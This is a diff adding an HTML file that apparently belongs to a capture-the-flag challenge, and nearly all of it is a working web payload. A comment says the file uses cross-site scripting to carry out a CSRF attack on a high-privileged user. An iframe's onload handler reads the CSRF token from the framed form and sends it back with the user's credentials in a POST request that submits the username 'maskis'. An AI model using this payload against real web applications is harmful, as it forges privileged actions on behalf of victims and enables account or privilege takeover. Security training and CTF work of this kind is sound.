@@ -1,0 +1,11 @@
+<!--
+Uses a XSS to perform a CSRF attack targeting a high privileged user.
+This is a part of challenge
+-->
+<iframe id="f" name="f" onload="var x=new XMLHttpRequest();x.open('POST', \
+            'http://origin/ctf/dat/csrf');x.setRequestHeader('Content-Type', \
+            'application/x-www-form-urlencoded');x.withCredentials=true; \
+            x.send('csrftoken='+ \ 
+                   document.getElementById('f').contentDocument.forms[0].elements[0].value \
+                   +'&username=maskis')" \ 
+            src="http://origin/ctf/dat/csrf"></iframe>
